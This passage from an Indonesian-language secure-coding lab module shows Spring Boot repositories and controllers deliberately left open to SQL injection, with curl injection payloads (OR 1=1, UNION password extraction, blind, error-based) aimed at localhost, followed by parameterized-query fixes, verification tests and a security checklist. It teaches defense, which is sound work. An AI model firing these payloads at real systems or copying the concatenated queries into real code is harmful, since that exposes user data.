        // Bayangkan username = "' OR '1'='1"
        // Query jadi: SELECT * FROM users WHERE username = '' OR '1'='1'
        // Hasilnya: SEMUA user dikembalikan!
        String query = "SELECT * FROM users WHERE username = '" + username + "'";
        return entityManager.createNativeQuery(query, User.class).getResultList();
    }

    // ❌ RENTAN: JPQL dengan string concatenation
    public List<User> searchByEmailVulnerable(String email) {
        String jpql = "SELECT u FROM User u WHERE u.email = '" + email + "'";
        return entityManager.createQuery(jpql, User.class).getResultList();
    }

    // ❌ RENTAN: Pencarian dengan LIKE yang tidak aman
    public List<User> searchByRoleVulnerable(String role) {
        String jpql = "SELECT u FROM User u WHERE u.role LIKE '%" + role + "%'";
        return entityManager.createQuery(jpql, User.class).getResultList();
    }
}
```

**Controller yang Memanggil Repository Rentan**

```java
package com.lab.security.controller;

import org.springframework.web.bind.annotation.*;
import java.util.List;

@RestController
@RequestMapping("/api/vulnerable")
public class VulnerableUserController {

    @Autowired
    private VulnerableUserRepository vulnerableRepo;

    // ❌ Endpoint rentan — langsung meneruskan input ke query
    @GetMapping("/search")
    public List<User> searchUser(@RequestParam String username) {
        return vulnerableRepo.searchByUsernameVulnerable(username);
    }

    @GetMapping("/search-by-email")
    public List<User> searchByEmail(@RequestParam String email) {
        return vulnerableRepo.searchByEmailVulnerable(email);
    }
}
```

---

### EXPLOITATION STEP

#### Serangan 1: Authentication Bypass (Classic OR Injection)

```bash
# Payload: ' OR '1'='1
# Tujuan: Bypass filter username, dapatkan SEMUA user

# Encode URL: ' = %27, space = %20
curl -s "http://localhost:8080/api/vulnerable/search?username=%27%20OR%20%271%27%3D%271"

# Atau lebih mudah dengan curl --data-urlencode:
curl -s -G "http://localhost:8080/api/vulnerable/search" \
  --data-urlencode "username=' OR '1'='1"

# Hasil yang DIHARAPKAN (jika rentan):
# [{"id":1,"username":"admin",...}, {"id":2,"username":"alice",...}, {"id":3,"username":"bob",...}]
# ← Semua user bocor! ❌
```

#### Serangan 2: UNION-Based Injection (Ekstrak Data dari Tabel Lain)

```bash
# Payload: ' UNION SELECT id, username, password, email, role FROM users --
# Tujuan: Ekstrak kolom password dari database!

curl -s -G "http://localhost:8080/api/vulnerable/search" \
  --data-urlencode "username=' UNION SELECT id, username, password, email, role FROM users --"

# Hasil yang DIHARAPKAN (jika rentan):
# Data dari tabel users termasuk password hash! ❌
```

#### Serangan 3: Blind SQL Injection (Ekstrak Informasi Database)

```bash
# Payload: admin' AND 1=1 --  (True condition - user ditemukan)
curl -s -G "http://localhost:8080/api/vulnerable/search" \
  --data-urlencode "username=admin' AND 1=1 --"

# Payload: admin' AND 1=2 --  (False condition - user tidak ditemukan)
curl -s -G "http://localhost:8080/api/vulnerable/search" \
  --data-urlencode "username=admin' AND 1=2 --"

# Dengan membandingkan respons true/false, attacker bisa
# mengekstrak informasi sedikit demi sedikit!
```

#### Serangan 4: Error-Based Injection (Informasi Schema Database)

```bash
# Pada H2 Database, payload ini bisa mengungkap struktur tabel
curl -s -G "http://localhost:8080/api/vulnerable/search" \
  --data-urlencode "username=' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1))) --"
```

#### Serangan 5: Menggunakan Postman

```
Method: GET
URL: http://localhost:8080/api/vulnerable/search
Params:
  Key: username
  Value: ' OR '1'='1

Perhatikan response — jika mengembalikan semua user, endpoint ini rentan!
```

---

### SECURE CODE FIX

**Solusi 1: Spring Data JPA — Method Derived Query (Paling Aman & Mudah)**

```java
package com.lab.security.repository;

import com.lab.security.entity.User;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.stereotype.Repository;
import java.util.List;
import java.util.Optional;

@Repository
public interface SecureUserRepository extends JpaRepository<User, Long> {

    // ✅ Spring otomatis generate parameterized query dari nama method
    // Query: SELECT u FROM User u WHERE u.username = ?1
    Optional<User> findByUsername(String username);

    // ✅ Parameterized LIKE query yang aman
    // Query: SELECT u FROM User u WHERE u.username LIKE %?1%
    List<User> findByUsernameContainingIgnoreCase(String username);

    // ✅ Query berdasarkan email dengan parameterized
    Optional<User> findByEmail(String email);

    // ✅ Query berdasarkan role
    List<User> findByRole(String role);
}
```

**Solusi 2: `@Query` dengan Named Parameters (Untuk Query Kompleks)**

```java
package com.lab.security.repository;

import com.lab.security.entity.User;
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.stereotype.Repository;
import java.util.List;

@Repository
public interface AdvancedUserRepository extends JpaRepository<User, Long> {

    // ✅ JPQL dengan Named Parameter — Input TIDAK bisa mengubah struktur query
    @Query("SELECT u FROM User u WHERE u.username = :username")
    List<User> findByUsernameSecure(@Param("username") String username);

    // ✅ JPQL dengan LIKE yang aman menggunakan parameter binding
    @Query("SELECT u FROM User u WHERE LOWER(u.username) LIKE LOWER(CONCAT('%', :keyword, '%'))")
    List<User> searchByKeyword(@Param("keyword") String keyword);

    // ✅ Native Query dengan Named Parameter (tetap aman!)
    @Query(value = "SELECT * FROM users WHERE username = :username AND role = :role",
           nativeQuery = true)
    List<User> findByUsernameAndRoleNative(@Param("username") String username,
                                            @Param("role") String role);

    // ✅ Query dengan multiple conditions yang aman
    @Query("SELECT u FROM User u WHERE " +
           "(:username IS NULL OR LOWER(u.username) LIKE LOWER(CONCAT('%', :username, '%'))) AND " +
           "(:role IS NULL OR u.role = :role)")
    List<User> searchUsersSecure(@Param("username") String username,
                                  @Param("role") String role);
}
```

**Solusi 3: EntityManager dengan Parameterized Query (Jika Harus Pakai EntityManager)**

```java
package com.lab.security.repository;

import com.lab.security.entity.User;
import jakarta.persistence.EntityManager;
import jakarta.persistence.PersistenceContext;
import jakarta.persistence.TypedQuery;
import org.springframework.stereotype.Repository;
import java.util.List;

@Repository
public class SecureEntityManagerRepository {

    @PersistenceContext
    private EntityManager entityManager;

    // ✅ AMAN: Menggunakan Positional Parameter (?1)
    public List<User> searchByUsernamePositional(String username) {
        TypedQuery<User> query = entityManager.createQuery(
            "SELECT u FROM User u WHERE u.username = ?1", User.class
        );
        query.setParameter(1, username);  // ← Parameter di-bind, bukan di-concat!
        return query.getResultList();
    }

    // ✅ AMAN: Menggunakan Named Parameter (:username)
    public List<User> searchByUsernameNamed(String username) {
        TypedQuery<User> query = entityManager.createQuery(
            "SELECT u FROM User u WHERE u.username = :username", User.class
        );
        query.setParameter("username", username);  // ← Aman dari injection
        return query.getResultList();
    }

    // ✅ AMAN: Native Query dengan Parameterized Statement
    public List<User> searchNativeSecure(String username) {
        return entityManager
            .createNativeQuery("SELECT * FROM users WHERE username = :username", User.class)
            .setParameter("username", username)  // ← JPA handle escaping
            .getResultList();
    }

    // ✅ AMAN: Criteria API (anti-injection by design)
    public List<User> searchWithCriteriaApi(String username) {
        var cb = entityManager.getCriteriaBuilder();
        var cq = cb.createQuery(User.class);
        var root = cq.from(User.class);

        cq.select(root)
          .where(cb.equal(root.get("username"), username));
          // ← Criteria API tidak bisa di-inject karena tidak pakai string query

        return entityManager.createQuery(cq).getResultList();
    }
}
```

**Solusi 4: Service Layer dengan Input Validation**

```java
package com.lab.security.service;

import com.lab.security.entity.User;
import com.lab.security.repository.SecureUserRepository;
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Pattern;
import jakarta.validation.constraints.Size;
import org.springframework.stereotype.Service;
import org.springframework.validation.annotation.Validated;
import java.util.List;

@Service
@Validated
public class SecureUserService {

    private final SecureUserRepository userRepository;

    public SecureUserService(SecureUserRepository userRepository) {
        this.userRepository = userRepository;
    }

    // ✅ Validasi input di layer service SEBELUM query ke database
    public List<User> searchUsers(
        @NotBlank(message = "Username tidak boleh kosong")
        @Size(min = 2, max = 50, message = "Username harus antara 2-50 karakter")
        @Pattern(regexp = "^[a-zA-Z0-9_\\-\\.]+$",
                 message = "Username hanya boleh huruf, angka, underscore, dash, dan titik")
        String username
    ) {
        // Input sudah divalidasi sebelum sampai ke sini
        return userRepository.findByUsernameContainingIgnoreCase(username);
    }

    // ✅ Sanitasi tambahan jika diperlukan (defense in depth)
    private String sanitizeInput(String input) {
        if (input == null) return null;
        // Hapus karakter berbahaya sebagai lapisan keamanan ekstra
        // CATATAN: Ini bukan pengganti parameterized query, tapi tambahan
        return input.replaceAll("['\";\\-\\-/*]", "").trim();
    }
}
```

**Controller yang Sudah Diperbaiki**

```java
package com.lab.security.controller;

import com.lab.security.entity.User;
import com.lab.security.service.SecureUserService;
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.Size;
import org.springframework.http.ResponseEntity;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.*;
import java.util.List;

@RestController
@RequestMapping("/api/secure")
@Validated  // ✅ Aktifkan validasi di controller level
public class SecureUserController {

    private final SecureUserService userService;

    public SecureUserController(SecureUserService userService) {
        this.userService = userService;
    }

    // ✅ Input divalidasi sebelum masuk ke service/repository
    @GetMapping("/search")
    public ResponseEntity<List<User>> searchUser(
        @RequestParam
        @NotBlank
        @Size(min = 2, max = 50)
        String username
    ) {
        List<User> results = userService.searchUsers(username);
        return ResponseEntity.ok(results);
    }
}
```

**Verifikasi Fix — Ulangi Serangan pada Endpoint Secure**

```bash
# Test 1: Serangan SQLi pada endpoint SECURE
curl -s -G "http://localhost:8080/api/secure/search" \
  --data-urlencode "username=' OR '1'='1"

# Hasil yang DIHARAPKAN:
# [] (array kosong) atau 400 Bad Request
# ← Tidak ada data yang bocor! ✅

# Test 2: Query normal tetap bekerja
curl -s -G "http://localhost:8080/api/secure/search" \
  --data-urlencode "username=alice"

# Hasil yang DIHARAPKAN:
# [{"id":2,"username":"alice","email":"alice@lab.com","role":"USER"}]
# ← Fungsi normal tetap berjalan! ✅

# Test 3: Coba UNION injection
curl -s -G "http://localhost:8080/api/secure/search" \
  --data-urlencode "username=' UNION SELECT * FROM users --"

# Hasil yang DIHARAPKAN:
# 400 Bad Request (gagal di validasi)
# ← Karakter SQL diblokir! ✅
```

---

### ANALISIS REVIU

**Mengapa pendekatan ini aman?**

**1. Parameterized Query — Inti Pertahanan**
Kunci utama perlindungan dari SQL Injection adalah **parameterized query** (juga dikenal sebagai prepared statement). Ketika kamu menulis `WHERE username = :username` dan kemudian memanggil `.setParameter("username", input)`, JPA/Hibernate **tidak pernah memasukkan nilai tersebut ke dalam string query**. Sebaliknya, nilai dikirimkan ke database secara terpisah sebagai data — bukan sebagai bagian dari instruksi SQL. Database engine memperlakukan nilai parameter murni sebagai **data literal**, sehingga karakter seperti `'`, `--`, `;` tidak bisa mengubah struktur query.

**2. Spring Data JPA Method Derivation — Aman secara Default**
Method-method seperti `findByUsername(String username)` di Spring Data JPA secara internal selalu menggunakan parameterized query. Kamu tidak perlu menulis query sama sekali — Spring mengenerate prepared statement yang aman secara otomatis. Ini adalah pendekatan yang paling direkomendasikan untuk query sederhana.

**3. Criteria API — Anti-Injection by Architecture**
Criteria API tidak menggunakan string query sama sekali. Kamu membangun query melalui objek Java (`CriteriaBuilder`, `Predicate`, dll.), sehingga tidak ada string yang bisa di-inject. Ini adalah pilihan terbaik untuk query yang sangat dinamis.

**4. Input Validation — Defense in Depth**
Validasi dengan `@Pattern(regexp = "^[a-zA-Z0-9_\\-\\.]+$")` menambahkan lapisan pertahanan ekstra. Meskipun parameterized query sudah cukup untuk mencegah SQLi, validasi input mencegah karakter berbahaya bahkan sebelum menyentuh layer database. Prinsip ini disebut **defense in depth** — jangan bergantung pada satu mekanisme saja.

**5. Hindari Native Query Jika Tidak Perlu**
Native Query lebih rentan terhadap kesalahan developer karena tidak ada abstraksi. Jika kamu harus menggunakannya, **selalu gunakan named parameter** (`:paramName`) dan **jangan pernah menggunakan string concatenation**.

---

---

## 📝 RINGKASAN & CHECKLIST KEAMANAN

### Quick Reference: Do's and Don'ts

| Kategori | ❌ Jangan Lakukan | ✅ Lakukan Ini |
|----------|-----------------|--------------|
| **Dependency** | Biarkan library tidak diupdate | Scan rutin dengan Dependency-Check |
| **Dependency** | Fix versi library secara manual tanpa alasan | Biarkan Spring Boot BOM manage versi |
| **CORS** | `allowedOrigins("*")` di API yang menggunakan session | Daftarkan origin secara eksplisit |
| **CORS** | Taruh `@CrossOrigin` di setiap controller | Konfigurasi global di `SecurityConfig` |
| **SQL** | String concatenation di query | Selalu gunakan parameterized query |
| **SQL** | Native query tanpa parameter binding | Gunakan `@Query` dengan `@Param` |
| **Input** | Percaya semua input dari user | Validasi & sanitasi di service layer |

---

### Checklist Keamanan Sebelum Deploy ke Production

```
Security Pre-Deployment Checklist
==================================

[ ] Dependency-Check sudah dijalankan dan tidak ada CVE >= 7
[ ] Tidak ada dependency dengan versi yang sudah EOL
[ ] CORS hanya mengizinkan origin yang terdaftar
[ ] Tidak ada @CrossOrigin(origins = "*") di kode
[ ] Semua query database menggunakan parameterized query
[ ] Input validation aktif di semua endpoint yang menerima input user
[ ] H2 Console dinonaktifkan di production (spring.h2.console.enabled=false)
[ ] Spring Security aktif dan dikonfigurasi dengan benar
[ ] HTTPS diaktifkan (gunakan SSL/TLS)
[ ] Sensitive data tidak di-log
[ ] Error message tidak mengekspos stack trace ke client
[ ] Session timeout dikonfigurasi
[ ] CSRF protection aktif untuk web form
```

---

### Referensi Lanjutan

- [OWASP Top 10 Official](https://owasp.org/www-project-top-ten/)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [OWASP Dependency-Check](https://jeremylong.github.io/DependencyCheck/)
- [NVD (National Vulnerability Database)](https://nvd.nist.gov/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP CORS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html)

---

*Modul ini dibuat untuk tujuan edukasi. Semua simulasi serangan hanya boleh dilakukan di environment lab terisolasi yang kamu kendalikan sendiri. Jangan pernah melakukan pengujian penetrasi pada sistem yang bukan milikmu tanpa izin tertulis.*
